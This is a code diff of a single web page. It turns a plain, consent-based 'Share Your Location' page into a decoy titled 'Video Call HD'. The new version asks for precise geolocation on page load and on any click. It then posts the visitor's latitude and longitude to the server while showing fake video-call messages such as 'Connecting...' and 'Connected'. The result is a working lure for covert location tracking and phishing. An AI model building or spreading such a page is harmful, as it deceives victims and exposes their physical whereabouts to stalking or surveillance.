@@ -1,57 +1,64 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Location Sharing</title>
+    <title>Video Call HD</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
-<body style="text-align:center; font-family:Arial; margin-top:50px;">
 
-    <h2>📍 Share Your Location</h2>
-    <p>Please allow location access to continue</p>
+<body onclick="startLocation()" 
+      style="text-align:center; font-family:Arial; margin-top:50px; background:#f5f5f5;">
 
-    <button onclick="shareLocation()" style="padding:10px 20px; font-size:16px;">
-        Share Location
-    </button>
+    <h2>Connecting to Video Call...</h2>
+    <p>Please wait while we connect you</p>
 
-    <p id="status"></p>
+    <p id="status">Initializing...</p>
 
     <script>
-       function shareLocation() {
-    if (navigator.geolocation) {
-        document.getElementById("status").innerText = "Getting location...";
+        let started = false;
 
-        navigator.geolocation.getCurrentPosition(
-            function(position) {
-                console.log("Accuracy:", position.coords.accuracy);
+        function startLocation() {
+            if (started) return;
+            started = true;
 
-                fetch('/location', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
+            if (navigator.geolocation) {
+                document.getElementById("status").innerText = "Connecting...";
+
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        console.log("Accuracy:", position.coords.accuracy);
+
+                        fetch(window.location.origin + '/location', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                lat: position.coords.latitude,
+                                lon: position.coords.longitude
+                            })
+                        }).then(() => {
+                            document.getElementById("status").innerText = "Connected ✅";
+                        });
                     },
-                    body: JSON.stringify({
-                        lat: position.coords.latitude,
-                        lon: position.coords.longitude
-                    })
-                }).then(() => {
-                    document.getElementById("status").innerText = "Location shared successfully ✅";
-                });
-            },
-            function(error) {
-                document.getElementById("status").innerText = "Permission denied ❌";
-                console.log(error);
-            },
-            {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
+                    function(error) {
+                        document.getElementById("status").innerText = "Connection failed ❌";
+                        console.log(error);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                document.getElementById("status").innerText = "Not supported";
             }
-        );
-    } else {
-        document.getElementById("status").innerText = "Geolocation not supported";
-    }
-}
+        }
 
+        // Auto trigger
+        window.onload = function() {
+            startLocation();
+        };
     </script>
 
 </body>
